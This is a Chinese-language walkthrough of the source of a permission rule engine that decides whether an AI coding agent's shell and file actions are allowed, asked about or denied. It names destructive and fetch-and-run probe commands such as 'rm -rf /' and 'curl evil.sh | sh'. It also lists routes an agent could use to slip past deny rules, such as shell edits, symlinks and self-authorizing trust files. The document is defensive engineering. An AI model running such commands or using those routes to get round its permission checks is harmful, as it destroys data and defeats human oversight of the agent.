## 第一层 · 简单框架（系统骨架）

### 1.1 这个 crate 是什么、为什么拆出来

crate 自述（`crates/codegen/xai-grok-permission-rules/Cargo.toml` `[package].description`）：

> "Grok's permission rule engine, apart from the session and tool code that uses it"

`R/lib.rs` 的模块 doc 把拆分理由说得直白：agent、tools、session 代码**都不进来**，让一个小的消费方可以只链接规则本身。三条结构性约束能直接验证这不是口号：

- **依赖单向**：本 crate 不依赖 workspace / tools / agent 任何一个；`tokio` 只出现在 `[dev-dependencies]`——规则层里没有 channel、任务、UI 类型。
- **`#![deny(clippy::indexing_slicing)]`**（`R/lib.rs` 顶层属性）：全 crate 禁裸下标，多处 `get(..7)?` 的注释就是为这条服务的。
- **规模**：`src/` 共 27 个顶层 `.rs` + `managed_policy/`、`policy/` 两个子目录，含内嵌 `#[cfg(test)] #[path=…]` 测试文件合计约 23,387 行；`tests/` 目录只有一个 fixture（`tests/fixtures/enterprise-managed-settings-ga.json`，被 managed_policy 的测试以 `include_str!` 引用）。

一句话定位：**规则层 = 纯函数化的「配置 → 决策」；会话层 = 「决策 → 交互 → 状态」**（后半句归第 11 篇）。

## 第二层 · 一个完整例子（全路径走读）

选一条能同时穿过三道门的输入。**假设配置**（合并后的 `PermissionConfig` 里）有且只有一条规则：`Bash(git:*)` → `Allow`。模型请求执行：

```
git push && rm -rf build/
```

会话层（`WS/permission/manager/`，归第 11 篇）把它包装成 `AccessKind::Bash` 后调用规则层，入口是 `crates/codegen/xai-grok-permission-rules/src/gate_preflight.rs` · `impl GatePreflight`（该 impl 头记作 +0） 函数：`evaluate` `偏移：+2`。它内部依次问三件事，最后汇总成一次预检：

```
GatePreflight::evaluate  (gate_preflight.rs impl +2)
 ├─ ① 直接规则求值
 │    CompiledPolicy::evaluate_with_cwd_details  (policy.rs impl +130)
 │      └─ evaluate_rules_with_base  (impl +177)：先扫 Deny → 记 Ask → Bash 合取 Allow
 │         `git push` 命中 Bash(git:*)；`rm -rf build/` 没有任何 allow 命中
 │         ⇒ 合取失败 ⇒ 不给 Allow，也不 Reject ⇒ direct = None（配置层没下结论）
 ├─ ② bash 命令门
 │    CompiledPolicy::evaluate_bash_command_gate  (impl +48)
 │      └─ policy::bash_commands::evaluate_bash_command_segments
 │           ├─ bash_command_splitting::all_commands_from_script（tree-sitter 拆成两段，成功）
 │           └─ bash_chain_fully_allowed：每段 peel 后各自命中 allow 才算全放行
 │              `rm -rf build/` 段不在任何 allow 下 ⇒ 链条不成立
 ├─ ③ shell 文件访问门
 │    CompiledPolicy::evaluate_shell_file_access_gate  (shell_access.rs impl +9)
 │      └─ evaluate_shell_file_access_inner  (impl +21)：解析出 invocation 与写路径，
 │         `rm` 的目标 build/ 没有命中任何 Read/Edit 的 deny/ask 规则 ⇒ escalate-only，
 │         本门不强制提问
 └─ 汇总（gate_preflight.rs struct GatePreflight，+0）：
      direct=None、bash 门无命中式 Ask、shell 门无强制 ⇒ policy_decision = None
→ 回到会话层：配置层没给 Allow、也没给 Reject/Ask ⇒ 按「匹配不到就 Ask」的 fail-closed
  默认走弹窗（第 11 篇第一层的「双层」）。**规则层本体的输出只有三态：
  Allow / Reject|PolicyDeny / Ask|None，弹窗本身不在这个 crate 里。**
```

图中的简写 `policy.rs` / `gate_preflight.rs` / `shell_access.rs` / `bash_command_splitting.rs` 均指 `crates/codegen/xai-grok-permission-rules/src/` 下同名文件；`impl +N` 相对该符号所属 impl 头行。

沿途每一步各自看到什么：

1. **直接规则求值**（`R/policy.rs` · `impl CompiledPolicy`，该 impl 头记作 +0）：`evaluate_with_cwd_details` `偏移：+130` 是带路径基准的求值入口，内部 `evaluate_rules_with_base` `偏移：+177` **按固定顺序扫三张表：Deny 优先、Ask 其次、Allow 最后**——`RuleAction` 的书写顺序不影响结论（第三层 3.1 详解）。对 `AccessKind::Bash`，allow 是**合取**语义：`bash_chain_fully_allowed`（`R/policy/bash_commands.rs`）要求拆出的**每个**段都各自命中某条 allow；本例第一段 `git push` 命中、第二段 `rm -rf build/` 不命中 ⇒ 整体不 Allow。
2. **bash 命令门**：`evaluate_bash_command_gate` `偏移：+48` → `evaluate_command_words` `偏移：+57` → `policy::bash_commands` 的 `evaluate_bash_command_segments`。拆分用 `R/bash_command_splitting.rs` · 符号：`all_commands_from_script`（内部 `try_parse_shell` + `try_parse_word_only_commands_sequence`，只允许白名单语法节点）；本例拆分成功，门给出「allow 链不成立」而非 fail-closed。
3. **shell 文件访问门**：`R/shell_access.rs` · `impl CompiledPolicy`（该文件给 `CompiledPolicy` 挂的第二段 impl，头记作 +0）函数：`evaluate_shell_file_access_gate` `偏移：+9` → `evaluate_shell_file_access_inner` `偏移：+21`。它从命令里抽出读/写路径操作数（`rm` 的 `build/`），拿 Read/Edit 规则重评；**只做升级（escalate-only）**——命中 deny/ask 才强制，命中 Allow 会被丢弃（第三层 3.6）。
4. **预检汇总**：`GatePreflight` 结构体（+0，五个字段把三个来源显式化：`direct`、`bash_command`、`shell_file`、`native_symlink_fail_closed`、`defers_gate_ask`）暴露 `policy_decision` `偏移：+37`、`shell_forced_prompt` `偏移：+51`、`admits_auto_classifier` `偏移：+63`、`prompt_trigger` `偏移：+90` 给会话层消费。

**对照变体**：把命令换成 `git push && rm -rf $(dirname "$TARGET")/build`。第 2 步的 tree-sitter 白名单里**没有命令替换节点**，`try_parse_word_only_commands_sequence` 返回 None；恢复解析（`R/bash_permission_script.rs` · `impl PermissionScript` 函数：`analyze` `偏移：+1`）也救不回来（`$(…)` 操作数不合格）⇒ `evaluate_command_words` `偏移：+57` 给出 `GateDecision::AskFailClosed`。同样是 Ask，**出处不同、豁免规则不同**：规则命中式 Ask 是真实策略、永不豁免；fail-closed 式 Ask 在 auto 模式下可以交给 LLM 分类器（`admits_auto_classifier` `偏移：+63`），但分类器给出 Allow 之后 deny 依旧 Reject、任何 Ask 依旧 Ask（`classifier_allowed_decision` `偏移：+69`）。这条溯源区分是本层的**核心语义**，3.1/3.3 展开。

## 第三层 · 详细逐步说明（主链路拆解）

> 以下 3.1~3.8 按「先结论、后源码」逐个展开；每条偏移均回源码实测。

### 3.1 CompiledPolicy：deny > ask > allow，且与书写顺序无关

文件：`crates/codegen/xai-grok-permission-rules/src/policy.rs`（2,597 行，含 61 个内嵌测试）。

**结构与编译**。`CompiledPolicy`（符号：`CompiledPolicy`，+0）字段：`config`、`matchers: Vec<Option<glob::Pattern>>`、`has_file_restrictions`、`has_bash_command_restrictions`、`has_bash_allow_rules`、`catchall`。`impl CompiledPolicy`（头记作 +0）函数：`new` `偏移：+1` 在编译 glob **之前**过滤掉 pattern 为 `"*"` 的规则——通配串不进 matcher 表，另走 `catchall` 位。

**求值顺序是硬编码的，不是配置决定的**。`evaluate_rules_with_base` `偏移：+177` 一次扫三张表：**先 Deny**（命中立即给出 `PolicyDeny/Reject`，并带上出处文案 `"Denied by permission policy: deny rule on {工具} matching \"{pattern}\""`——用户看到的拒绝永远能追溯到具体规则）；**再记 Ask 标志**；**最后 Allow**——但 Bash 的 allow 是**合取**语义（每个拆出段都要被授权，见 3.2），其他工具命中一条 allow 即 Allow。汇总用顶层函数 `combine_decisions`（符号：`combine_decisions`，+0）配 `decision_rank`（+0）：`Reject/PolicyDeny = 3 > Ask = 2 > Allow = 1`。**后果**：只要存在命中的 ask 规则，任何 allow 都无法翻盘——用户在配置里把 allow 写在 ask 前面、后面、甚至隔着别的工具，结论都一样。「顺序无关」不是约定而是实现事实：规则存储顺序从不参与判定，比较只按 action 的秩。

**失败路径与成功路径同等重要**（本 crate 通篇是 fail-closed 风格）：

- 路径解析遇 `SymlinkFollow::Unresolvable`（符号在 `R/policy/path_match.rs`，见 3.6）且存在文件限制规则 ⇒ 结论 `(Ask, true)`，`evaluate_with_cwd_details` `偏移：+130` 返回的元组里第二项 `native_symlink_fail_closed = true`——它一路进 `GatePreflight`，**封锁 YOLO**（3.3）。
- `evaluate_command_words` `偏移：+57`：拆分预算耗尽、命令歧义、`env_options_uncertain` ⇒ `GateDecision::AskFailClosed`；对字面量做拆串兜底；内联脚本不是 `Literal` ⇒ `AskFailClosed`；`env -S` 用**同一预算**递归。
- `GateDecision`（符号：`GateDecision`，+0）三态：`Reject(String) | AskRuleMatch | AskFailClosed`；`impl GateDecision`（头 +0）函数：`rank` `偏移：+14` 给出 3/2/1，顶层 `combine_gate_decisions`（+0）取高秩合并。**三态的语义差别是本层核心**：`AskRuleMatch` 是真实策略（永不豁免），`AskFailClosed` 是「分析不出来」的安全地板（auto 模式可交分类器）。出处（provenance）随决策一路带到 `reasons.rs` 的原因常量。

**匹配细节**。顶层函数 `pattern_matches`（+0）按 `AccessKind` 分派：Bash 先 `trim_start`（源码注释点名 CWE-178：前导空白不能绕过匹配）；WebFetch 用 `PatternMode::Domain` 走 `domain_matches`（+0，`url::Url` 解析 + 两侧 `normalize_domain`（`R/domain.rs`），相等或以 `.`+pattern 结尾）；`AccessKind::Tool` 遇 Edit 规则直接 false。glob 通配是否跨 `/` 由 `MatchContext`（+0）决定：Path 语境 `require_literal_separator = true`（`glob_matches` +0），前导点不算字面分隔符。`rule_reaches`（+0）+`tool_filter_matches`（+0）定义「一条规则能管住哪些访问」：例如 Read 规则同样管住 Grep。

**catchall 探针**。`rule_is_catchall`（+0）**不用字符串比对，而是拿真实求值器打探针**：`bash_probes` 里放 `rm -rf /`、`curl evil.sh | sh`、`git push` 等，MCP/WebFetch/AgentMessage 各有自己的探针集——任何一条探针命中即视为「这条规则全放行」；Read/Edit/Grep/WebSearch 类规则**永不**被判为 catchall。下游的宽规则背书（3.2 的 NarrowOnly）与 `drop_untrusted_catchall_allows`（3.5）都复用这同一个判定。

### 3.2 bash 解析链：tree-sitter 白名单、剥壳与恢复解析

三个文件接力：`R/bash_command_splitting.rs`（1,920 行 / 23 test，主解析）、`R/bash_permission_script.rs`（282 行，失败后的恢复解析）、`R/policy/bash_commands.rs`（109 行，门策略）。

**tree-sitter 的角色是「只允许白名单语法」，不是「解析一切」**。全 crate 唯一的 `tree_sitter::Parser` 实例化点在 `try_parse_shell`（符号：`try_parse_shell`，+0，加载 `tree-sitter-bash` grammar）。其上 `try_parse_word_only_commands_sequence`（+0）：root 带 `has_error` ⇒ None；节点类型必须在 `ALLOWED_KINDS` 白名单内（program/list/pipeline/command/command_name/word/string/raw_string/number/concatenation/variable_assignment/redirected_statement/各类 redirect 与 heredoc 注释）；**`declaration_command` 被故意排除**（源码注释：`export` 会绕开 env 守卫）；标点白名单 `ALLOWED_PUNCT_TOKENS` 只有 `&& || ; | " ' = > >> < << >& &> &>>`，出现未知标点（含后台 `&`）⇒ None。**命令替换 `$(…)`、进程替换 `<(...)` 都不在白名单**——这就是第二层变体里 `AskFailClosed` 的来源。

### 3.4 managed_policy：企业受管策略的层级与非对称

目录：`crates/codegen/xai-grok-permission-rules/src/managed_policy/`（8 文件 5,527 行 / 35 test，测试全部集中在 `tests.rs` 一个文件里；`tests/fixtures/enterprise-managed-settings-ga.json` 是其企业 JSON 形状回归 fixture，由测试 `include_str!` 引用）。

### 3.6 shell 访问门与受保护编辑路径

文件：`crates/codegen/xai-grok-permission-rules/src/shell_access.rs`（3,372 行 = 代码约 1,344 + 51 个内嵌测试，全 crate 测试最密的文件之一）。模块 doc 一句话点题：**防止「用 shell 绕过 Read/Edit 的 deny/ask」**——配置文件不许你编辑 `.env`，那 `sed -i` 也不许。

**主流程**（`impl CompiledPolicy`，该文件内的第二段 impl，头记作 +0）：`evaluate_shell_file_access_gate` `偏移：+9` → `evaluate_shell_file_access_inner` `偏移：+21`。inner 的顺序：解析失败 ⇒ 只在**递归进入**内联脚本时给 `AskFailClosed` 地板（顶层另有顶层的判据）；成功则收集三类事实——命令调用（`shell_command_invocations`）、重定向目标（`shell_redirect_targets`）、cwd 污染位置（`cd|pushd|env -C` 出现的位置）；重定向目标**歧义** ⇒ forced ask；每个 invocation 先过四个地板：剥壳预算耗尽 / 拆串 / env 选项不确定 / 透明前缀歧义，任一命中即问；`bash -c` 的 Literal 脚本**递归**进本门（`MAX_INLINE_SHELL_DEPTH` 独立预算），`Untrusted|Unrecognized` ⇒ forced ask；`cd/pushd/popd` 本身跳过。

**escalate-only 是硬规则**：`evaluate_shell_path` `偏移：+167` 对同一目标的 lexical / anchored / symlink-target 三种形态分别重评规则，**取到的 Allow 一律丢弃、只接受升级**（deny/ask 命中才改写结论）——三形态里任何一个被判 Ask 就 Ask，绝不允许「另一种拼法恰好被 allow」来翻案。`cwd_unpinned`（脚本里出现过 cd）时只做文本比对，相对路径一律 `AskFailClosed`。路径形态学在 `R/policy/path_match.rs`：`RuleBase`（+0）用 `OnceCell` 缓存规则的物理形态、`without_physical` 供无 fs 语境；`path_match_forms`（+0）生成含 cwd 相对与 `./` 前缀的形态（含 `..` 时抑制物理 cwd 形态）；`is_tilde_path`（+0）**永不与 cwd 拼接**——注释解释：造出 `./~/…` 反而会满足 `./**`；`resolve_following_symlinks`（+0）内 `MAX_SYMLINK_DEPTH = 40`，dangling leaf 先解析父目录，metadata 报非 NotFound 错误 ⇒ None（fail-closed）；`SymlinkFollow`（+0）+`follow_absolute_symlink`（+0）把「不可解」升格成 3.1 的 YOLO 封锁信号。

### 3.8 folder trust / trust store / worktree 归并

三个文件：`folder_trust.rs`（纯判定）、`trust.rs`（store 落盘）、`worktree.rs`（**私有**只读 DB 副本，`R/lib.rs` 里 `mod worktree;` 无 `pub`）。workspace 侧的交互与编排留在 `WS/folder_trust.rs`、`WS/trust.rs`（re-export 壳），归第 11 篇。

**纯判定**（`folder_trust.rs`）。`decide`（+0）的优先级写在 doc 注释里，六档：①feature off ⇒ Trusted；②store 记录可信 ⇒ Trusted；③key 不可记录（`$HOME`、文件系统根、相对路径）⇒ Trusted；④无 trust-sensitive 配置 ⇒ Trusted；⑤交互式（能弹窗）⇒ Prompt；⑥其余 ⇒ Untrusted。`resolve_trust`（+0）把 ③④ 标 `Provisional`（`TrustDurability`：只有 feature-off 与 store 记录是 durable，`is_durably_trusted`）；紧邻的注释**明确禁止缓存 no-configs 允许**——配置可以由 `git pull` 或 agent 事后写进来，缓存「现在没配置」就等于让下一次 `/hooks reload` 在无信任决定下跑配置（TOCTOU）。`PromptPolicy::FailClosed` 时 Prompt ⇒ Untrusted/Durable。feature 开关：`feature_enabled`（+0）先判 `folder_trust_inert`（+0）——**没有 `GROK_VERSION` 编译戳的本地构建信任一切且不读 store**（测试设 `TEST_VERSION_ENV` 可恢复生效）；否则按 `BoolFlag` 链 `env GROK_FOLDER_TRUST` → user config `[folder_trust].enabled` → managed → remote `folder_trust_enabled`，`.default(true)` **默认开**。

**store**（`trust.rs`）。文件形状与策略写在模块 doc：`[folders."/abs/repo/root"] trusted/decided_at`、`0600`、原子写、根植于**全新调用的** `xai_dirs::resolve_grok_home`（trust_store_home）——注释点名绝不用 `grok_home()` 的 OnceLock、也绝不写 cwd 相对 `./.grok`：否则 clone 自带的 `./.grok/trusted_folders.toml` 就能**自我授权**。无 home ⇒ `empty`：「什么都不信、什么都不写」，`path=None` 时写入直接 fail closed。`is_trusted`（`impl TrustStore` `偏移：+68`）：不可读的 store **不是空 allow-list**（直接 false）；查询 key 先 canonicalize，覆盖式匹配取**最长深度**，同深度并列 ⇒ `trusted &= record.trusted`（手工编辑出矛盾记录时 fail closed）。`has_decision`（`偏移：+122`）只精确匹配——供 legacy hook-trust 迁移，避免把用户对子目录的决定外推到本目录。写入 `record_decision_strict`（`偏移：+139`）：`is_unsafe_trust_root`（+0）⇒ `Recorded::Skipped`；无 backing path ⇒ Skipped；`disk_readable == false` 先重试读；然后在 `ExclusiveLock`（fs2 建议锁，旁车 `trusted_folders.toml.lock`）下**重读-改-写**；`persist_doc` 用同目录 `NamedTempFile` + `sync_all` + `persist` 原子替换（注释：单纯 `flush` 不保证落盘）；**内存状态只在落盘成功后才提交**。`read_doc_strict` 先 `symlink_metadata` 探测：**悬空符号链接算「存在」**，绝不因 follow 时 NotFound 而当 Missing——否则 persist 会覆盖掉那条链接。

**workspace key 归并**（`workspace_key` +0 → `git_derived_workspace_key` +0）：①cwd 在 `<grok_home>/worktrees/` 下且 `worktree.rs` · `source_repo_for_cwd`（+0）命中 ⇒ 用 source repo 的 **git root**（覆盖 standalone clone 与从子目录起 `grok -w` 两种情况；source 已删则退回记录路径）；②git2 发现且 `repo.is_worktree()` 且 commondir 校验通过 ⇒ 折叠到主 workdir；③否则 `repo.workdir()`；④非仓库 ⇒ `canonicalize(cwd)`；⑤结果若 `is_unsafe_trust_root` ⇒ 退回 `canonicalize(cwd)`。`workspace_id`（+0）对不存在的路径先取最近存在祖先（git2 discover 对缺失路径会失败）。

**worktree 只读副本**（`worktree.rs`）。模块 doc 直说这是 `xai-fast-worktree` 的 `WorktreeDb::get` 的**只读副本**，动机：读 WAL 模式的 sqlite 库可能创建 `-wal/-shm` 文件、网络盘上 open 还可能转换 journal mode——规则层「只想查一下」，不能留下任何写副作用。`open_read_only`（+0）经 `xai-sqlite-journal::JournalMode` 只读打开，DB 不存在直接 None（测试 `missing_registry_is_a_miss_and_is_not_created` 断言**未创建文件**）；只支持 `SCHEMA_VERSION = 1`，版本不符/行不可解码/`json` metadata 坏 ⇒ 一律 miss（SQL 里写 `json_valid(metadata)` 让 sqlite 先筛）；`decode_source_repo`（+0）逐列解码 writer 的全部列——「writer 拒绝的行这里也拒绝」；Windows 反斜杠路径（不含 `/`）走 id→label 查找。
